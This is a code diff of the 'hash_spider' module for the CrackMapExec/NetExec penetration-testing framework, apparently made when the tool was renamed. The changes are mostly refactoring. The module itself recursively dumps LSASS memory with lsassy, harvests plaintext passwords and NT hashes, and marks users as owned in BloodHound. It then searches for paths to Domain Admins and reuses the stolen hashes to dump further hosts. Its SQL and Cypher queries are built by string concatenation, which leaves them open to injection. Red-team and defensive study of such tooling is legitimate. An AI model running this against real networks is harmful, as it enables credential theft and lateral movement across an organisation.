@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 # Author: Peter Gormington (@hackerm00n on Twitter)
 import logging
 from sqlite3 import connect
@@ -12,7 +10,6 @@ from lsassy.session import Session
 from lsassy.impacketfile import ImpacketFile
 
 credentials_data = []
-admin_results = []
 found_users = []
 reported_da = []
 
@@ -24,28 +21,27 @@ def neo4j_conn(context, connection, driver):
             session = driver.session()
             list(session.run("MATCH (g:Group) return g LIMIT 1"))
             context.log.display("Connection Successful!")
-        except AuthError as e:
+        except AuthError:
             context.log.fail("Invalid credentials")
-        except ServiceUnavailable as e:
+        except ServiceUnavailable:
             context.log.fail("Could not connect to neo4j database")
         except Exception as e:
             context.log.fail("Error querying domain admins")
             context.log.debug(e)
     else:
-        context.log.fail("BloodHound not marked enabled. Check cme.conf")
+        context.log.fail("BloodHound not marked enabled. Check nxc.conf")
         exit(1)
 
 
 def neo4j_local_admins(context, driver):
-    global admin_results
     try:
         session = driver.session()
         admins = session.run("MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS ORDER BY ADMIN_COUNT DESC")  # This query pulls all PCs and their local admins from Bloodhound. Based on: https://github.com/xenoscr/Useful-BloodHound-Queries/blob/master/List-Queries.md and other similar posts
-        context.log.success("Admins and PCs obtained.")
-    except Exception:
-        context.log.fail("Could not pull admins")
-        exit()
-    admin_results = [record for record in admins.data()]
+        context.log.success("Admins and PCs obtained")
+    except Exception as e:
+        context.log.fail(f"Could not pull admins: {e}")
+        return None
+    return list(admins.data())
 
 
 def create_db(local_admins, dbconnection, cursor):
@@ -69,16 +65,12 @@ def create_db(local_admins, dbconnection, cursor):
             if user not in admin_users:
                 admin_users.append(user)
     for user in admin_users:
-        cursor.execute("""INSERT OR IGNORE INTO admin_users(username) VALUES(?)""", [user])
+        cursor.execute("INSERT OR IGNORE INTO admin_users(username) VALUES(?)", [user])
     dbconnection.commit()
 
 
 def process_creds(context, connection, credentials_data, dbconnection, cursor, driver):
-    if connection.args.local_auth:
-        context.log.extra["host"] = connection.conn.getServerDNSDomainName()
-    else:
-        context.log.extra["host"] = connection.domain
-    context.log.extra["hostname"] = connection.host.upper()
+    domain = connection.conn.getServerDNSDomainName() if connection.args.local_auth else connection.domain
     for result in credentials_data:
         username = result["username"].upper().split("@")[0]
         nthash = result["nthash"]
@@ -89,7 +81,7 @@ def process_creds(context, connection, credentials_data, dbconnection, cursor, d
                 "UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'",
                 [password],
             )
-            username = f"{username.upper()}@{context.log.extra['host'].upper()}"
+            username = f"{username.upper()}@{domain.upper()}"
             dbconnection.commit()
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
@@ -103,17 +95,17 @@ def process_creds(context, connection, credentials_data, dbconnection, cursor, d
                 [nthash],
             )
             dbconnection.commit()
-            username = f"{username.upper()}@{context.log.extra['host'].upper()}"
+            username = f"{username.upper()}@{domain.upper()}"
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
             path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.owned=true AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
-            paths = [record for record in path_to_da.data()]
+            paths = list(path_to_da.data())
 
             for path in paths:
                 if path:
-                    for key, value in path.items():
+                    for value in path.values():
                         for item in value:
-                            if type(item) == dict:
+                            if isinstance(item, dict):
                                 if {item["name"]} not in reported_da:
                                     context.log.success(f"You have a valid path to DA as {item['name']}.")
                                     reported_da.append({item["name"]})
@@ -134,7 +126,7 @@ def initial_run(connection, cursor):
     )
 
 
-class CMEModule:
+class NXCModule:
     name = "hash_spider"
     description = "Dump lsass recursively from a given hash using BH to find local admins"
     supported_protocols = ["smb"]
@@ -147,15 +139,17 @@ class CMEModule:
         self.reset = None
         self.reset_dumped = None
         self.method = None
+
     @staticmethod
     def save_credentials(context, connection, domain, username, password, lmhash, nthash):
-        host_id = context.db.get_computers(connection.host)[0][0]
+        host_id = context.db.get_hosts(connection.host)[0][0]
         if password is not None:
-            credential_type = 'plaintext'
+            credential_type = "plaintext"
         else:
-            credential_type = 'hash'
-            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
+            credential_type = "hash"
+            password = ":".join(h for h in [lmhash, nthash] if h is not None)
         context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
+
     def options(self, context, module_options):
         """
         METHOD              Method to use to dump lsass.exe with lsassy
@@ -173,7 +167,7 @@ class CMEModule:
         # lsassy also removes all other handlers and overwrites the formatter which is bad (we want ours)
         # so what we do is define "success" as a logging level, then do nothing with the output
         logging.addLevelName(25, "SUCCESS")
-        setattr(logging, "success", lambda message, *args: ())
+        logging.success = lambda message, *args: ()
 
         host = connection.host
         domain_name = connection.domain
@@ -198,13 +192,13 @@ class CMEModule:
             return False
         dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
         if dumper is None:
-            context.log.fail("Unable to load dump method '{}'".format(self.method))
+            context.log.fail(f"Unable to load dump method '{self.method}'")
             return False
         file = dumper.dump()
         if file is None:
             context.log.fail("Unable to dump lsass")
             return False
-        credentials, tickets, masterkeys = Parser(file).parse()
+        credentials, tickets, masterkeys = Parser(host, file).parse()
         file.close()
         ImpacketFile.delete(session, file.get_file_path())
         if credentials is None:
@@ -247,10 +241,10 @@ class CMEModule:
                     if len(more_to_dump) > 0:
                         context.log.display(f"User {user[0]} has more access to {pc[0]}. Attempting to dump.")
                         connection.domain = user[0].split("@")[1]
-                        setattr(connection, "host", pc[0].split(".")[0])
-                        setattr(connection, "username", user[0].split("@")[0])
-                        setattr(connection, "nthash", user[1])
-                        setattr(connection, "nthash", user[1])
+                        connection.host = pc[0].split(".")[0]
+                        connection.username = user[0].split("@")[0]
+                        connection.nthash = user[1]
+                        connection.nthash = user[1]
                         try:
                             self.run_lsassy(context, connection, cursor)
                             cursor.execute("UPDATE pc_and_admins SET dumped = 'TRUE' WHERE pc_name LIKE '" + pc[0] + "%'")
@@ -271,8 +265,8 @@ class CMEModule:
             exit()
 
     def on_admin_login(self, context, connection):
-        db_path = connection.config.get("CME", "workspace")
-        # DB will be saved at ./CrackMapExec/hash_spider_default.sqlite3 if workspace in cme.conf is "default"
+        db_path = connection.config.get("nxc", "workspace")
+        # DB will be saved at ./NetExec/hash_spider_default.sqlite3 if workspace in nxc.conf is "default"
         db_name = f"hash_spider_{db_path}.sqlite3"
         dbconnection = connect(db_name, check_same_thread=False, isolation_level=None)
 
@@ -302,7 +296,7 @@ class CMEModule:
         neo4j_db = f"bolt://{neo4j_uri}:{neo4j_port}"
         driver = GraphDatabase.driver(neo4j_db, auth=basic_auth(neo4j_user, neo4j_pass), encrypted=False)
         neo4j_conn(context, connection, driver)
-        neo4j_local_admins(context, driver)
+        admin_results = neo4j_local_admins(context, driver)
         create_db(admin_results, dbconnection, cursor)
         initial_run(connection, cursor)
         context.log.display("Running lsassy")
